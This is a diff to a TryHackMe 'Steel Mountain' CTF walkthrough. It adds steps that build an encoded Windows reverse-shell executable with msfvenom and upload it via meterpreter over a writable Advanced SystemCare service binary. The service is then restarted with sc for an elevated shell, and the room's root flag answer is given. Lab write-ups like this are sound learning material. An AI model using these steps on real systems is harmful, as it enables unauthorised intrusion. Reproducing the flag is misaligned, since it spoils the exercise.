@@ -74,7 +74,8 @@
 > The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able.
 > This means we can replace the legitimate application with our malicious one, restart the service,which will run our infected program!
 - Use msfvenom to generate a reverse shell as an Windows executable.
-    - Picture: [Steel_Moutain_18.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_18.png)
+    - sudo ./msfvenom -p windows/shell_reverse_tcp LHOST=[Local machine IP] LPORT=4443 -e x86/shikata_ga_nai -f exe -o [Path]/ASCService.exe
+        - Picture: <br>[Steel_Moutain_18.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_18.png)<br>[Steel_Moutain_24.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_24.png)
     - Exit
     - put the current meterpreter in "Background"
         -  Picture: [Steel_Moutain_19.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_19.png)
@@ -87,3 +88,34 @@
             - set LPORT [port] --> Same port defined in the reveserse tcp
             - exploit -j
                 - Picture: [Steel_Moutain_21.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_21.png)
+    - Upload the executable to the target machine
+        - upload /Users/laurentnebout/Documents/Tools/ASCService.exe
+        - Picture: [Steel_Moutain_22.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_22.png)
+        - Switch to the previous session
+            - session -i 1
+                - Picture: [Steel_Moutain_23.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_23.png)
+    - Navigate to C:\Program Files (x86)\IObit\Advanced SystemCare\
+        > Be carefull, the target machine is a windows machine. To navigate, you need to use \ to be able to interpret "space"
+        - cd Program\ Files\ (x86)
+    - Start shell
+        - shell
+        - Picture: [Steel_Moutain_25.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_25.png)
+        - Stop service
+            - sc stop AdvancedSystemCareService9
+            - Picture: [Steel_Moutain_26.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_26.png)
+        - Quit
+        - Picture: [Steel_Moutain_27.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_27.png)
+        - Go back to shell
+            - shell
+        - Start the service
+            - sc start AdvancedSystemCareService9
+            - Picture: [Steel_Moutain_28.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_28.png)
+        - Quit
+        - background
+            - Picture: [Steel_Moutain_29.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_29.png)
+        - session -i [reverse tcp session number]
+            - Picture: [Steel_Moutain_30.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_30.png)
+        - Navigate to /Users/Administrator/Desktop
+        - more root.txt
+            - Picture: [Steel_Moutain_30.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_30.png)
+        - **Answer** : 9af5f314f57607c00fd09803a587db80
